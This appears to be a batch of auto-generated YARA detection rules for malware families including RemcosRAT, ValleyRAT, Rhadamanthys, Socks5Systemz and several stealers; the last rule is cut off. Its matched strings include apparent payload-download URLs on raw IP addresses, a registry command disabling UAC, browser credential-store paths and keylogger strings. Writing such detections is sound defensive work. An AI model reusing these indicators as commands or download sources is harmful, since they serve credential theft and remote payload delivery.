/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-10
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule RemcosRAT_signature__4f67aeda01a0484282e8c59006b0b352_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_4f67aeda01a0484282e8c59006b0b352(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8fff00cf201e75ce64dac4109780d57b122deed394ded3d8867a43a85516a23e"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "lnindtgt.exe" fullword wide /* score: '22.00'*/
      $s3 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "worriless" fullword wide /* score: '8.00'*/
      $s5 = "initialiserede" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}


rule RemcosRAT_signature__9a16e282eba7cc710070c0586c947693_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_9a16e282eba7cc710070c0586c947693(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d223a2f132ab3c96f3d16cfdb00d11efce9d9068ee2627c089a76d1e15274656"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__ea4e67a31ace1a72683a99b80cf37830_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_ea4e67a31ace1a72683a99b80cf37830(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8c459da35cc2a38d218859f9fb816013c0d33c4bdd3792a69c20beaf5609687d"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "nstall System v3.06.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s5 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__ff26bb14d4e19e4acf769fa08a4b854b_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_ff26bb14d4e19e4acf769fa08a4b854b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f553605fb8722472509ee1612fe24c835aec8d7a71d3554d59983f3524467725"
   strings:
      $s1 = "Alt+ Clipboard does not support Icons/Menu '%s' is already being used by another formDocked control must have a name%Error remo" wide /* score: '16.00'*/
      $s2 = "Elevation<" fullword ascii /* score: '16.00'*/
      $s3 = "+3D effect percent must be between %d and %d+Circular Series dependences are not allowed+Bar Width Percent must be between 1 and" wide /* score: '16.00'*/
      $s4 = "iVCF6VCN6VCV6" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s5 = " http://crl.verisign.com/pca3.crl0" fullword ascii /* score: '13.00'*/
      $s6 = "Set Size Exceeded.*Error on call Winsock2 library function %s&Error on loading Winsock2 library (%s)DThis authentication method " wide /* score: '12.00'*/
      $s7 = "5VCR6VCR8" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s8 = "%VCF5VCN5VCV5" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s9 = "OnGetBarStyle0" fullword ascii /* score: '10.00'*/
      $s10 = "Q\\Ot:\\Tw:dZXMhTtG^OX-VJs=]" fullword ascii /* score: '10.00'*/
      $s11 = "eMXDo.XeI" fullword ascii /* score: '10.00'*/
      $s12 = "TCircledSeries4" fullword ascii /* score: '10.00'*/
      $s13 = "Common Engineering Services1" fullword ascii /* score: '10.00'*/
      $s14 = "TCircledSeries" fullword ascii /* score: '9.00'*/
      $s15 = "474?4\\4|4" fullword ascii /* score: '9.00'*/ /* hex encoded string 'GDD' */
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      8 of them
}

rule ValleyRAT_signature__9b5d64ca9f87b73db4240f21f950c39d_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_9b5d64ca9f87b73db4240f21f950c39d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a5d01bb8a5126458d447026dc2572deb74e86619c87f1d0591dff43c141073e"
   strings:
      $s1 = "ATC.EXE" fullword wide /* score: '19.00'*/
      $s2 = "\\debug.log" fullword wide /* score: '17.00'*/
      $s3 = "[!] GetTempPathW " fullword ascii /* score: '16.00'*/
      $s4 = "MaldevAcad.tmp" fullword wide /* score: '13.00'*/
      $s5 = "http://38.47.97.210:1978/" fullword wide /* score: '12.00'*/
      $s6 = "           <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/>" fullword ascii /* score: '11.00'*/
      $s7 = "   processorArchitecture=\"X86\"" fullword ascii /* score: '10.00'*/
      $s8 = ":55555555" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UUUU' */
      $s9 = "basdewesdfs" fullword ascii /* score: '8.00'*/
      $s10 = "hcbreeds" fullword ascii /* score: '8.00'*/
      $s11 = "asdgwesdess" fullword ascii /* score: '8.00'*/
      $s12 = "iiiiiiiiiiiiiix" fullword ascii /* score: '8.00'*/
      $s13 = "zbxdsveeds" fullword ascii /* score: '8.00'*/
      $s14 = "dbfasdadfewssd" fullword ascii /* score: '8.00'*/
      $s15 = "iiiiiiiiix" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule ValleyRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__67c39f2e {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_67c39f2e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "67c39f2e56dc93e4b6f16b4658366462f8f90acad03792b2f5c1797bd9f89702"
   strings:
      $x1 = "http://23.248.202.194/user4/awesomium.dll" fullword ascii /* score: '31.00'*/
      $s2 = "http://23.248.202.194/user4/GG.exe" fullword ascii /* score: '30.00'*/
      $s3 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s4 = "http://23.248.202.194/user4/hello.bin" fullword ascii /* score: '26.00'*/
      $s5 = "DComdlg32.dll" fullword wide /* score: '26.00'*/
      $s6 = "DKernel32.dll" fullword wide /* score: '23.00'*/
      $s7 = "Dkernel32.dll" fullword wide /* score: '23.00'*/
      $s8 = "HongTai.exe" fullword wide /* score: '22.00'*/
      $s9 = "%s\\awesomium.dll" fullword ascii /* score: '20.00'*/
      $s10 = "_SlHNqQyRq.exe" fullword wide /* score: '19.00'*/
      $s11 = "%s\\SystemHelper.exe" fullword ascii /* score: '18.00'*/
      $s12 = "windowsSettings><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></app" ascii /* score: '17.00'*/
      $s13 = "66666.Scr" fullword wide /* score: '15.00'*/
      $s14 = "<</Type /FontDescriptor" fullword ascii /* score: '14.00'*/
      $s15 = "D:\\a\\_work\\1\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\auxdata.cpp" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule SalatStealer_signature__94400fe3e62cd2376124312fe435b8e4_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_94400fe3e62cd2376124312fe435b8e4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c42ae157d6add456789a59d83c8824e1443333eecae6e5e840059acf3d2058fe"
   strings:
      $s1 = "/c ping -n 3 127.0.0.1 & copy /Y \"" fullword ascii /* score: '20.00'*/
      $s2 = "* [Va$o" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule SalatStealer_signature__d5d9d937853db8b666bd4b525813d7bd_imphash_ {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_d5d9d937853db8b666bd4b525813d7bd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32f460c5c96bfeb88df8fbdef81bba4ff976662c1661db0a9eb3dddc3758f1bc"
   strings:
      $s1 = "/c ping -n 3 127.0.0.1 & copy /Y \"" fullword ascii /* score: '20.00'*/
      $s2 = "* Q#8c" fullword ascii /* score: '9.00'*/
      $s3 = "$\"51,.*'" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Q' */
      $s4 = "nIRcX>_G/:3yC" fullword ascii /* score: '9.00'*/
      $s5 = "kiznxrt" fullword ascii /* score: '8.00'*/
      $s6 = "wagkotj" fullword ascii /* score: '8.00'*/
      $s7 = "CR3W>9" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 25000KB and
      all of them
}

rule SnakeKeylogger_signature__8e1ca82498002da7f4efcb6c1aab495b_imphash_ {
   meta:
      description = "_subset_batch - file SnakeKeylogger(signature)_8e1ca82498002da7f4efcb6c1aab495b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0201652520917243e47dbe8f9b2d32b4bb1764b9398426c097ea6d2e993a3750"
   strings:
      $x1 = "]*\\AC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\Stub\\Project1.vbp" fullword wide /* score: '38.00'*/
      $s2 = "(Email): helloworld@yahoo.com" fullword ascii /* score: '23.00'*/
      $s3 = "BMS - System Login Screen" fullword ascii /* score: '23.00'*/
      $s4 = "cmdlogin" fullword ascii /* score: '22.00'*/
      $s5 = "kinos.exe" fullword wide /* score: '22.00'*/
      $s6 = "BMS - Change Password Screen" fullword ascii /* score: '20.00'*/
      $s7 = "loginbar" fullword ascii /* score: '19.00'*/
      $s8 = "txtlogin" fullword ascii /* score: '19.00'*/
      $s9 = "select * from users where loginid = '" fullword wide /* score: '19.00'*/
      $s10 = "51284E47617760614E4267707E7B714E" wide /* score: '19.00'*/ /* hex encoded string 'Q(NGaw`aNBgp~{qN' */
      $s11 = "Executei`" fullword ascii /* score: '18.00'*/
      $s12 = "60.DLL" fullword ascii /* score: '17.00'*/
      $s13 = "Login ID Does Not Exist! Enter Correct Login ID" fullword wide /* score: '17.00'*/
      $s14 = "Change System User's Password:" fullword ascii /* score: '15.00'*/
      $s15 = "BMS - SYSTEM CONTROL PANEL" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash_ {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "eec434b60d0854c163e3b1dbd8f88746cfd0f6153789572990d4ffa192d894a4"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "!\">{74[+" fullword ascii /* score: '9.00'*/ /* hex encoded string 't' */
      $s5 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s6 = "ldezeuv" fullword ascii /* score: '8.00'*/
      $s7 = "jfufafi" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__2c702fe6 {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_2c702fe6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2c702fe6281b0934ae16be7fc5d4d5eb035fdf87ffc3e3e2dec9b9a2f2babaac"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "qxtlK.EAP" fullword ascii /* score: '10.00'*/
      $s5 = "# -PUyX" fullword ascii /* score: '9.00'*/
      $s6 = "* x\\RrC" fullword ascii /* score: '9.00'*/
      $s7 = "`- -KX," fullword ascii /* score: '9.00'*/
      $s8 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s9 = "WfwG]M -" fullword ascii /* score: '8.00'*/
      $s10 = "NTjS!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__5b3b428c {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_5b3b428c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5b3b428c2625b3c8278b9b3a1d14002ef4760df42439db17efd3576ae952c6ca"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "* !]EufBzU$" fullword ascii /* score: '12.00'*/
      $s4 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "* *Wt7" fullword ascii /* score: '9.00'*/
      $s6 = "* hRjd" fullword ascii /* score: '9.00'*/
      $s7 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__71a2c517 {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_71a2c517.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "71a2c517ebca75a515e9d3adf45a27f967e6e42c0f3da2525088c612a2712339"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "ymoo0w:\\" fullword ascii /* score: '10.00'*/
      $s5 = "BGKD.IWT" fullword ascii /* score: '10.00'*/
      $s6 = "98jMwSx.RWX" fullword ascii /* score: '10.00'*/
      $s7 = "* \\[Nd" fullword ascii /* score: '9.00'*/
      $s8 = "xIRCc1w" fullword ascii /* score: '9.00'*/
      $s9 = "* #PHY)" fullword ascii /* score: '9.00'*/
      $s10 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__d6fa3a64 {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_d6fa3a64.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d6fa3a64a1017e5fcf191f02cd574963c6f10f270531c8ff763401d13951dc40"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "* Cxs|" fullword ascii /* score: '9.00'*/
      $s5 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s6 = "NuPF+ %j" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule RemcosRAT_signature__8b3e0763eddbb01367bd21396e110071_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_8b3e0763eddbb01367bd21396e110071(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f4cb5ddc22fbf3f8118eaa14c1cbb7aae10ba6b65ff44cb2345b10f2eb48304"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $x2 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii /* score: '34.00'*/
      $x3 = "/k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWOR" ascii /* score: '34.00'*/
      $s4 = "CreateObject(\"WScript.Shell\").Run \"cmd /c \"\"" fullword wide /* score: '26.00'*/
      $s5 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" fullword ascii /* score: '23.00'*/
      $s6 = "rmclient.exe" fullword wide /* score: '22.00'*/
      $s7 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" fullword ascii /* score: '22.00'*/
      $s8 = "Keylogger initialization failure: error " fullword ascii /* score: '20.00'*/
      $s9 = "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders" fullword ascii /* score: '19.00'*/
      $s10 = "Offline Keylogger Started" fullword ascii /* score: '17.00'*/
      $s11 = "Online Keylogger Started" fullword ascii /* score: '17.00'*/
      $s12 = "Offline Keylogger Stopped" fullword ascii /* score: '17.00'*/
      $s13 = "Online Keylogger Stopped" fullword ascii /* score: '17.00'*/
      $s14 = "fso.DeleteFile(Wscript.ScriptFullName)" fullword wide /* score: '17.00'*/
      $s15 = "Executing file: " fullword ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule SkuldStealer_signature__f83741541cbf6c34f2147d55fb8f4100_imphash_ {
   meta:
      description = "_subset_batch - file SkuldStealer(signature)_f83741541cbf6c34f2147d55fb8f4100(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2d62c9fb90cd4e709ad4397dcb70af9d2af443bded9e9d210fe8af5dd216c782"
   strings:
      $s1 = "vcruntime140.dll" fullword ascii /* score: '26.00'*/
      $s2 = "DCRC failed in the encrypted file %s. Corrupt file or wrong password." fullword wide /* score: '25.00'*/
      $s3 = "python311.dll" fullword ascii /* score: '23.00'*/
      $s4 = "python3.dll" fullword ascii /* score: '23.00'*/
      $s5 = "program.exe" fullword ascii /* score: '22.00'*/
      $s6 = "lib/multiprocessing/popen_spawn_win32.pyc" fullword ascii /* score: '21.00'*/
      $s7 = "lib/multiprocessing/spawn.pyc" fullword ascii /* score: '21.00'*/
      $s8 = "lib/multiprocessing/popen_spawn_posix.pyc" fullword ascii /* score: '21.00'*/
      $s9 = "lib/libcrypto-1_1.dll" fullword ascii /* score: '20.00'*/
      $s10 = "lib/libffi-8.dll" fullword ascii /* score: '20.00'*/
      $s11 = "lib/libssl-1_1.dll" fullword ascii /* score: '20.00'*/
      $s12 = "Setup=program.exe" fullword ascii /* score: '19.00'*/
      $s13 = "d:\\Projects\\WinRAR\\SFX\\build\\sfxzip64\\Release\\sfxzip.pdb" fullword ascii /* score: '19.00'*/
      $s14 = "lib/multiprocessing/context.pyc" fullword ascii /* score: '18.00'*/
      $s15 = "lib/multiprocessing/connection.pyc" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 26000KB and
      8 of them
}

rule ValleyRAT_signature__71d8340344d1f2c98964bc46476d20e1_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_71d8340344d1f2c98964bc46476d20e1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b6d6ff28ef103da5f794d27841f13b790329616cea55b7ec8f181585b5beb638"
   strings:
      $s1 = "c:\\users\\administrator\\documents\\visual studio 2015\\Projects\\ConsoleApplication10\\Release\\ConsoleApplication10.pdb" fullword ascii /* score: '29.00'*/
      $s2 = "(Symantec SHA256 TimeStamping Signer - G3" fullword ascii /* score: '15.00'*/
      $s3 = "(Symantec SHA256 TimeStamping Signer - G30" fullword ascii /* score: '15.00'*/
      $s4 = ",Tencent Technology(Shenzhen) Company Limited1" fullword ascii /* score: '14.00'*/
      $s5 = ",Tencent Technology(Shenzhen) Company Limited0" fullword ascii /* score: '14.00'*/
      $s6 = "http://sf.symcb.com/sf.crl0a" fullword ascii /* score: '13.00'*/
      $s7 = "3_3X3O3" fullword ascii /* reversed goodware string '3O3X3_3' */ /* score: '11.00'*/
      $s8 = "3_3W3O3" fullword ascii /* reversed goodware string '3O3W3_3' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule Renamer_signature__c00b6ba7dbbc6abee9ace3a65a49ba24_imphash_ {
   meta:
      description = "_subset_batch - file Renamer(signature)_c00b6ba7dbbc6abee9ace3a65a49ba24(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4667778efed63cfd5317bd2e9451f885ea235d110b99deda5f74c11a9167066c"
   strings:
      $s1 = "icon=%SystemRoot%\\system32\\SHELL32.dll,4" fullword wide /* score: '30.00'*/
      $s2 = "shell\\open\\command=" fullword wide /* score: '17.00'*/
      $s3 = "DropTarget<qD" fullword ascii /* score: '16.00'*/
      $s4 = "Alt+ Clipboard does not support Icons+Operation not supported on selected printer" fullword wide /* score: '16.00'*/
      $s5 = "Commandh" fullword ascii /* score: '14.00'*/
      $s6 = "        <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s7 = "OnDrawItemP" fullword ascii /* score: '11.00'*/
      $s8 = "        processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s9 = "    processorArchitecture=\"*\"/>" fullword ascii /* score: '10.00'*/
      $s10 = "RootKey@" fullword ascii /* score: '10.00'*/
      $s11 = "C:\\Windows\\Paint" fullword wide /* score: '10.00'*/
      $s12 = "hold.inf" fullword wide /* score: '10.00'*/
      $s13 = "2'2,2d2{2" fullword ascii /* score: '9.00'*/ /* hex encoded string '"-"' */
      $s14 = "5(5,5<5[5|5" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UUU' */
      $s15 = "EInvalidGraphicOperationhhD" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Rhadamanthys_signature__b4f070f0028c97d4b44509b262314b3d_imphash_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b4f070f0028c97d4b44509b262314b3d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c0d0eef15ed5fa87fb6f39cc9430fdfbf0625e94c05ba57faa0940027ea6d2ad"
   strings:
      $s1 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s2 = "d:\\a01\\_work\\12\\s\\\\binaries\\amd64ret\\bin\\amd64\\\\mfc140u.amd64.pdb" fullword ascii /* score: '22.00'*/
      $s3 = "y%TsMFC140%Ts.DLL" fullword wide /* score: '20.00'*/
      $s4 = "4042444648" ascii /* score: '17.00'*/ /* hex encoded string '@BDFH' */
      $s5 = "%s%s%X.tmp" fullword wide /* score: '15.00'*/
      $s6 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\oledrop2.cpp" fullword wide /* score: '15.00'*/
      $s7 = "Nhttp://www.microsoft.com/pkiops/crl/Microsoft%20Time-Stamp%20PCA%202010(1).crl0l" fullword ascii /* score: '13.00'*/
      $s8 = "Phttp://www.microsoft.com/pkiops/certs/Microsoft%20Time-Stamp%20PCA%202010(1).crt0" fullword ascii /* score: '13.00'*/
      $s9 = "d:\\a01\\_work\\12\\s\\src\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin1.inl" fullword wide /* score: '13.00'*/
      $s10 = "d:\\a01\\_work\\12\\s\\src\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin2.inl" fullword wide /* score: '13.00'*/
      $s11 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\afxstate.cpp" fullword wide /* score: '13.00'*/
      $s12 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\appcore.cpp" fullword wide /* score: '13.00'*/
      $s13 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\array_s.cpp" fullword wide /* score: '13.00'*/
      $s14 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\auxdata.cpp" fullword wide /* score: '13.00'*/
      $s15 = "d:\\a01\\_work\\12\\s\\src\\vctools\\VC7Libs\\Ship\\ATLMFC\\Src\\MFC\\dbcore.cpp" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      8 of them
}

rule ValleyRAT_signature__83e3c2e38a442145eaa2522b14e0d343_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_83e3c2e38a442145eaa2522b14e0d343(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1cc62d774236839a8067b217ed9844b475d78eca9b27c5f6419ad1ffa35b9d64"
   strings:
      $x1 = "C:\\Users\\Admin\\Downloads\\Test360\\x64\\Release\\Test360.pdb" fullword ascii /* score: '39.00'*/
      $s2 = "wscript.exe \"%s\"" fullword ascii /* score: '23.00'*/
      $s3 = "shortcut.TargetPath = \"%s\"" fullword ascii /* score: '20.00'*/
      $s4 = "75674E69636F6C61736275" ascii /* score: '17.00'*/ /* hex encoded string 'ugNicolasbu' */
      $s5 = "%s\\SystemTool.lnk" fullword ascii /* score: '14.00'*/
      $s6 = "Set shortcut = WshShell.CreateShortcut(\"%s\")" fullword ascii /* score: '12.00'*/
      $s7 = "AD5E5E44FDE694E87E2489346DE81C1CEE9316B6C2BA71F5C435A3AE9F0613F0AD436017028E1A8AFA6C485DA147E05C8FEFF8507C003D19ECCD6FAF33617D26" ascii /* score: '11.00'*/
      $s8 = "AB8436127C164EAE0E783A721769BF00224BC3E64B4B409CB16EDC31BAA996309FB1CD2A4205F560EF21037D41B570C8A3EDADFA72A6CC9ED31D9F757B83010F" ascii /* score: '11.00'*/
      $s9 = "FB31DBF9B9F5EB35A2A24F9E53BC464AC7752C14C2F46451BDAA4450C10117FCFE412967026A57455F5DF0FFF07D0985DE2091EFEF75D5BA79CECBDF27FB48A4" ascii /* score: '11.00'*/
      $s10 = "1C695FA0ECB48B214B9E9DD7C43E55B544DFD3BA9FB53E268C20591F595CC5CFEE714500363E275570BADECE09FB9D33B8564B48EEBD4A7EF0034EB7C3C1B3FD" ascii /* score: '11.00'*/
      $s11 = "A3AF5A1A81DFE20484C796C6902E0F22F7D24504218DF9EF9749F9A30D277B92228FBDF4C848F0B1A85D35955CF6E0ECD50B0D412DCDFAFA7BD9856143E8D48C" ascii /* score: '11.00'*/
      $s12 = "031A0ADC1244E07420E2921C370F0276EDF927A68A369E8E5F667A720AC8D7093E6B92AEB61BB9A354100773C8A2C472D2DFD43DDAE642B6C38E6309D31E44AB" ascii /* score: '11.00'*/
